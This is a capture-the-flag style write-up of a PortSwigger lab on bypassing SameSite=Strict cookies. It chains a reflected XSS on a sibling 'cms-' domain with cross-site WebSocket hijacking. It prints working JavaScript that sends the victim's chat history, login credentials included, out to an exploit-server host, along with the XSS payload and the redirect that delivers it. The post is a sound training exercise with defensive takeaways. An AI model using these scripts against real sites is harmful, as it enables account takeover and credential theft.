# Lab - SameSite Strict Bypass via Sibling Domain 🎯

I just completed a challenging lab on PortSwigger's Web Security Academy: CSRF - SameSite Strict bypass via sibling domain. Here's a step-by-step breakdown of how I solved it without using Burp Collaborator.

## 🔍 Objective

The goal was to exploit a cross-site WebSocket hijacking (CSWSH) vulnerability by bypassing SameSite=Strict cookie restrictions and accessing the victim's chat history containing their login credentials.

## 🛠️ Steps to Solve the Lab

### 1. Understanding the WebSocket Chat Functionality

- Observed the `/chat` WebSocket handshake request and determined it didn't contain any unpredictable tokens.
- Discovered that sending a `READY` message to the WebSocket endpoint triggered the server to return the entire chat history.

### 2. Crafting the CSWSH Exploit

Instead of using Burp Collaborator, I created my custom exploit using JavaScript:

```javascript
var webSocket = new WebSocket("wss://0af40095033d514e80d971ea00c80092.web-security-academy.net/chat");

webSocket.onopen = function (evt) {
    webSocket.send("READY");
};

webSocket.onmessage = function (evt) { 
    var message = evt.data; 
    fetch("https://exploit-0aa400f8031551e080f6703a01a200b3.exploit-server.net/exploit?message=" + btoa(message));
};
```

**Purpose of the Script:**
- Establishes a WebSocket connection to the target site.
- Sends a `READY` message to trigger the chat history retrieval.
- Exfiltrates the chat data to the exploit server using a `fetch` request.

### 3. Identifying the SameSite Restriction

- Discovered that `SameSite=Strict` cookies were protecting the WebSocket connection, preventing cross-site attacks.

### 4. Finding the Sibling Domain Vulnerability

- Noticed the `Access-Control-Allow-Origin` header in responses, revealing a sibling domain `cms-[LAB-ID].web-security-academy.net`.
- Found a reflected XSS vulnerability in the sibling domain's login form:
  - Injected `<script>alert(1)</script>` into the username field, which executed successfully.

### 5. Exploiting the Sibling Domain

Modified the CSWSH script to include the payload in the reflected XSS attack:

```javascript
var ws = new WebSocket("wss://0af40095033d514e80d971ea00c80092.web-security-academy.net/chat");
ws.onopen = function () {
    ws.send("READY");
};
ws.onmessage = function (event) {
    fetch("https://exploit-0aa400f8031551e080f6703a01a200b3.exploit-server.net/exploit?message=" + btoa(event.data));
};
```

URL-encoded the script and embedded it in the `username` parameter of the sibling domain’s login form:

```javascript
document.location = "https://cms-0af40095033d514e80d971ea00c80092.web-security-academy.net/login?username=[URL-ENCODED-PAYLOAD]&password=anything";
```

### 6. Delivering the Exploit

- Delivered the crafted exploit through the exploit server.
- Captured the victim's chat history, including their login credentials.

### 7. Using the Credentials

- Used the exfiltrated username and password to log in to the victim's account and successfully solved the lab.

## 🔑 Takeaways

- `SameSite=Strict` cookies can block CSRF but aren't foolproof, especially when sibling domains are involved.
- WebSocket vulnerabilities like CSWSH can be exploited if safeguards like unpredictable tokens aren't implemented.
- Layered defenses, including CSRF tokens, origin checks, and domain-specific cookie policies, are critical for mitigating these risks.

## 💡 Final Thoughts

This lab demonstrated how security mechanisms like `SameSite=Strict` can be bypassed when paired with other vulnerabilities. It also highlighted the importance of securing all domains under the same root to prevent such attacks.

🎉 Another lab conquered!
